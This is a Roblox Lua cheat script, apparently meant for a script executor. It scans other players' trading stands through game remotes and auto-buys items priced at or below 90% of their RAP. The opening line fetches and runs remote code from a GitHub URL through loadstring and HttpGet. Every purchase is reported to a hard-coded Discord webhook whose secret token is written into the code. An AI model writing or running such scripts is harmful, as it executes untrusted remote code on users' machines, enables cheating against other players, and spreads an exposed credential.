loadstring(game:HttpGet("https://raw.githubusercontent.com/amukerd/rbx-scripts/refs/heads/main/cdt/extra.lua"))()

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer

local GetOffersRemote = ReplicatedStorage.Remotes.Services.TradingHubServiceRemotes.GetOffers
local GetRapRemote = ReplicatedStorage.Remotes.Services.RapRemotes.GetRap
local OfferPurchaseRemote = ReplicatedStorage.Remotes.Services.TradingHubServiceRemotes.OfferPurchase

local WebhookURL = "https://discord.com/api/webhooks/1480676513668923627/c-7JOdimxEYnh3Ol2DNcCuzHyPaCrZ015TTlDnGL3aM7Rg42zRJZhFSAc3qmqNK8t51I"

local RAP_PERCENT = 0.90
local SCAN_INTERVAL = 0.5

local activeThreads = {}
local boughtItems = {}

local function formatNumber(value)
    local formatted = tostring(value)

    while true do
        local k
        formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", "%1,%2")

        if k == 0 then
            break
        end
    end

    return formatted
end

local function sendWebhook(itemName, price, rapValue, sellerName)
    local message =
        string.format(
        "🚨 **Deal Bought!** 🚨\n\nPlayer: %s\nItem: %s\nPrice: %s\nRAP: %s\nSeller: %s",
        LocalPlayer.Name,
        itemName,
        formatNumber(price),
        formatNumber(rapValue),
        sellerName
    )

    local requestFunc = http_request or request or HttpPost

    if requestFunc then
        pcall(
            function()
                requestFunc(
                    {
                        Url = WebhookURL,
                        Method = "POST",
                        Headers = {
                            ["Content-Type"] = "application/json"
                        },
                        Body = HttpService:JSONEncode(
                            {
                                content = message
                            }
                        )
                    }
                )
            end
        )
    end
end

local function scanPlayerStand(targetPlayer)
    local success, offers =
        pcall(
        function()
            return GetOffersRemote:InvokeServer(targetPlayer)
        end
    )

    if not success or typeof(offers) ~= "table" then
        return
    end

    for _, offer in ipairs(offers) do
        if offer.Item then
            local itemName = offer.Item.Name
            local price = offer.Price or offer.Amount

            if price and not boughtItems[itemName] then
                local rapSuccess, rapValue =
                    pcall(
                    function()
                        return GetRapRemote:InvokeServer(itemName)
                    end
                )

                if rapSuccess and rapValue then
                    if price <= (rapValue * RAP_PERCENT) then
                        boughtItems[itemName] = true

                        local buySuccess, result =
                            pcall(
                            function()
                                return OfferPurchaseRemote:InvokeServer(targetPlayer, offer)
                            end
                        )

                        if buySuccess then
                            sendWebhook(itemName, price, rapValue, targetPlayer.Name)
                        else
                            boughtItems[itemName] = nil
                        end
                    end
                end
            end
        end
    end
end

local function watchPlayer(targetPlayer)
    while targetPlayer.Parent do
        pcall(
            function()
                scanPlayerStand(targetPlayer)
            end
        )

        task.wait(SCAN_INTERVAL)
    end
end

local function startWatching(player)
    if player == LocalPlayer then
        return
    end

    if activeThreads[player] then
        return
    end

    activeThreads[player] =
        task.spawn(
        function()
            watchPlayer(player)
        end
    )
end

local function stopWatching(player)
    local thread = activeThreads[player]

    if thread then
        task.cancel(thread)
        activeThreads[player] = nil
    end
end

Players.PlayerAdded:Connect(startWatching)

Players.PlayerRemoving:Connect(stopWatching)

for _, player in ipairs(Players:GetPlayers()) do
    startWatching(player)
end

print("--- Lobby Monitor Started ---")
